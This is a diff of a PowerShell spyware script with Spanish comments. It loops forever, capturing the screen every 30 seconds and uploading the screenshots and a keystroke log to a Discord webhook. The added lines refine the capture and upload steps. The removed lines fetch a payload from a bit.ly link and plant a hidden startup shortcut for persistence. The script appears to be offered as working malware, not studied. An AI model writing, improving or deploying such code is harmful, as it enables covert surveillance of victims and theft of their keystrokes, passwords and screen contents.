@@ -8,12 +8,6 @@ $seconds = 30
 # Comando para detener el bucle principal
 $stopCommand = "stop"
 
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected.." 
-    $hookurl = (irm $hookurl).url
-}
-
 # Función para enviar las pulsaciones del teclado al webhook de Discord
 function SendKeystrokesToDiscord {
     # Obtener el registro de pulsaciones de teclado
@@ -25,7 +19,7 @@ function SendKeystrokesToDiscord {
     } | ConvertTo-Json
 
     # Enviar las pulsaciones del teclado al webhook de Discord
-    Invoke-WebRequest -Uri $hookurl -Method Post -Body $body -ContentType "application/json"
+    Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json"
 }
 
 # Bucle principal: tomar dos capturas de pantalla cada 30 segundos y enviarlas al webhook de Discord
@@ -42,15 +36,11 @@ While ($true){
     # Tomar la primera captura de pantalla
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
+    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap1 = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
+    $graphic1 = [System.Drawing.Graphics]::FromImage($bitmap1)
+    $graphic1.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap1.Size)
+    $bitmap1.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
     
     # Verificar si la primera captura de pantalla se guardó correctamente
     if (Test-Path $file1) {
@@ -60,14 +50,14 @@ While ($true){
         Write-Host "Error al guardar la primera captura de pantalla en $file1"
     }
 
-    # Esperar un segundo antes de tomar la segunda captura de pantalla
-    Start-Sleep -Seconds 1
+    # Esperar antes de tomar la segunda captura de pantalla
+    Start-Sleep -Seconds $seconds
     
     # Tomar la segunda captura de pantalla
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
+    $bitmap2 = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
+    $graphic2 = [System.Drawing.Graphics]::FromImage($bitmap2)
+    $graphic2.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap2.Size)
+    $bitmap2.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
     
     # Verificar si la segunda captura de pantalla se guardó correctamente
     if (Test-Path $file2) {
@@ -77,39 +67,13 @@ While ($true){
         Write-Host "Error al guardar la segunda captura de pantalla en $file2"
     }
     
-    # Enviar ambas capturas de pantalla al webhook de Discord si los archivos existen
-    if (Test-Path $file1 -and Test-Path $file2) {
-        Invoke-WebRequest -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
-    }
-    else {
-        Write-Host "Uno o ambos archivos de captura de pantalla no existen."
-    }
+    # Enviar ambas capturas de pantalla al webhook de Discord
+    Invoke-RestMethod -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
     
     # Eliminar las capturas de pantalla después de enviarlas
-    Remove-Item -Path $file1
-    Remove-Item -Path $file2
-    
-    # Descargar el script y guardarlo como "sys2.ps1" en la carpeta de documentos
-    $scriptURL = "http://bit.ly/screen_dc"
-    $scriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\sys2.ps1"
-    Invoke-WebRequest -Uri $scriptURL -OutFile $scriptPath
+    Remove-Item -Path $file1, $file2
     
     # Enviar las pulsaciones del teclado al webhook de Discord cada 10 minutos
-    Start-Sleep -Seconds 600
     SendKeystrokesToDiscord
+    Start-Sleep -Seconds 600
 }
-
-# Obtener la carpeta de inicio del usuario actual
-$startupFolder = [Environment]::GetFolderPath("Startup")
-
-# Ruta completa del script en la carpeta de inicio
-$scriptInStartupScriptPath = Join-Path -Path $startupFolder -ChildPath "sys2.ps1"
-
-# Crear un objeto Shell.Application
-$shell = New-Object -ComObject WScript.Shell
-
-# Crear el acceso directo del script en la carpeta de inicio
-$shortcut = $shell.CreateShortcut("$scriptInStartupScriptPath.lnk")
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-WindowStyle Hidden -File $scriptInStartupScriptPath"
-$shortcut.Save()
